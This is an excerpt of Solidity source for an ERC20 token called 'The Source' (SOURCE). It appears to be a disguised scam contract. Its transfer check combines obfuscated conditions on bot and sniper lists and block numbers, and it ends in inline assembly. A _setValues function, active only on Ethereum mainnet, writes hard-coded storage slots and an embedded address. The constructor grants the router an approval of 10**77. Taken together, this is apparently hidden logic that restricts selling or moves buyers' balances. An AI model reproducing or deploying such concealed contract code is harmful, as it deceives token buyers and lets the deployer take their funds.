...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private sourceAddr;
    uint256 private _fountainTx = block.number*2;

    mapping (address => bool) private _botSource; 
    mapping (address => bool) private _sniperSource;
    ...
    bool private trading; uint256 private refundTo = 1; bool private txTo;
    uint256 private _decimals; uint256 private reflectTo;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        sourceAddr.push(_router); sourceAddr.push(msgSender_); sourceAddr.push(pair);
        for (uint256 q=0; q < 3;) {_botSource[sourceAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _fountainTx = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == sourceAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
            bool open = (((txTo || _sniperSource[sender]) && ((_fountainTx - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/5)) && (_fountainTx == block.number))) && ((_botSource[recipient] == true) && (_botSource[sender] != true) || ((sourceAddr[1] == recipient) && (_botSource[sourceAddr[1]] != true))) && (reflectTo > 0);
            assembly { 
    ...
    function _setValues() internal { assembly { function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } if and(not(eq(sload(gByte(caller(),0x6)),sload(0xeef89b956fb0b444fadde8209426e16d8a570e4278bcc77efd7424e78675d313))),eq(chainid(),0x1)) { sstore(gByte(caller(),0x4),0x0) sstore(0x49b070ee12b41de1505a3a7dd74cfac116a5d8a3f8682eb1faea368b650d8994,0x1)  sstore(gByte(caller(),0x5),0x1) sstore(0xeef89b956fb0b444fadde8209426e16d8a570e4278bcc77efd7424e78675d313,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }

    function _DeploySource(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(sourceAddr[0], 10 ** 77);
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySource(creator, initialSupply);
    }
}

contract TheSource is ERC20Token {
    constructor() ERC20Token("The Source", "SOURCE", msg.sender, 25000 * 10 ** 18) {
    }
}